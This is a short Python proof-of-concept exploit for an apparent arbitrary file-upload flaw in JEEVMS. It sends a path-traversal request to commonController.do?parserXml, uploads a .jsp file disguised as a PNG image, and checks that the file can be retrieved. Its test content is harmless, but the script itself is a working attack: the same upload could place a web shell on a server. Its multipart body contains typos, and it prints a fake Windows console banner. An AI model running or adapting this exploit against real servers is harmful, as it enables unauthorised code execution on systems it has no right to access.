#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()

def verify(site):
    target = site + "/api/%2e%2e/commonController.do?parserXml"
    headers = {
        "User-Agent": "Mozilla/2.0 (compatible; MSIE 3.01; Windows 95",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarygcflwtei"
    }
    filename = "vulntest"
    data = """------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; "name="name"\r\n\r\n{}.png\r\n------WebKitFormBoundarygcflwtei\r\nontent-Disposition: form-data; name="documentTitle"\r\n\r\nblank\r\n------WebKitFormBoundarygcflwtei\r\nContent-Disposition: form-data; name="file"; filename="{}.jsp"\r\nContent-Type: image/png\r\n\r\nHelloWorld\r\n------WebKitFormBoundarygcflwtei--""".format(filename,filename)
    response = requests.post(target, headers=headers, data=data, verify=False)
    status_code = response.status_code
    content = response.text
    if status_code == 200 and 'jsonStr' in content and 'success' in content:
        result_url = site+'/{}.jsp'.format(filename)
        response = requests.get(result_url, verify=False, timeout=15)
        if response.status_code == 200 and 'HelloWorld' in response.text:
            return result_url
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 JEEVMS-commonController-upload.py ",target)
    data = verify(target)
    if data:
        print("[+]漏洞存在，上传后的路径为：", data)
    else:
        print("[-]漏洞不存在")
